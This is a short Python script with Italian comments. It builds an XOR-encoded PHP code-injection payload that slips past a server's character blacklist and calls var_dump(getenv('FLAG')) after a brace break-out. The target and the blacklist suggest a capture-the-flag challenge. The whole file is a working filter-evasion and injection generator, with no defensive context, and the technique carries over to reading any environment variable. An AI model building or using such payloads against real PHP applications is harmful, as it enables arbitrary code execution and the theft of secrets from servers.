import sys

# Lista caratteri proibiti dal server
blacklist = ['`', '[', '*', '.', '\\', '=']

def get_xor_payload(target, key):
    # Ripete la chiave per coprire la lunghezza del target
    full_key = (key * (len(target) // len(key) + 1))[:len(target)]
    partner = ""
    for i in range(len(target)):
        # Calcola il partner XOR
        valore = ord(target[i]) ^ ord(full_key[i])
        
        # CONTROLLO: Se il risultato non è un carattere stampabile (ASCII 33-126),
        # allora lo spazio vuoto è causato da un carattere di controllo.
        # Se esce questo, la chiave che stai usando non va bene.
        if valore < 33 or valore > 126:
            print(f"[!] ATTENZIONE: La chiave '{key}' genera un carattere non stampabile (ASCII {valore}) per la lettera '{target[i]}'")
            print("[!] CAMBIA CHIAVE (es. usa numeri diversi) finché non sparisce questo errore.")
            sys.exit()
            
        partner += chr(valore)
    
    return f"('{partner.replace(chr(39), chr(92)+chr(39))}'^'{key}')"

# --- DEFINISCI QUI LA TUA STRUTTURA ---
# Se ottieni errori di "carattere non stampabile", cambia solo i numeri qui sotto!
data = [
    ("var_dump", "00000000"), #HO 8 LETTERE A SINISTRA E VOGLIO 8 A DESTRA
    ("getenv", "AAAAAA"),
    ("FLAG", "1111")
]

# Assemblaggio automatico
p1 = get_xor_payload(data[0][0], data[0][1])
p2 = get_xor_payload(data[1][0], data[1][1])
p3 = get_xor_payload(data[2][0], data[2][1])

payload_finale = f"}}; {p1}({p2}({p3})); if(1){{"

# Controllo finale blacklist
for char in blacklist:
    if char in payload_finale:
        print(f"[!] ERRORE: Il payload contiene il carattere vietato: '{char}'")
        sys.exit()

print("--- PAYLOAD PRONTO ---")
print(payload_finale)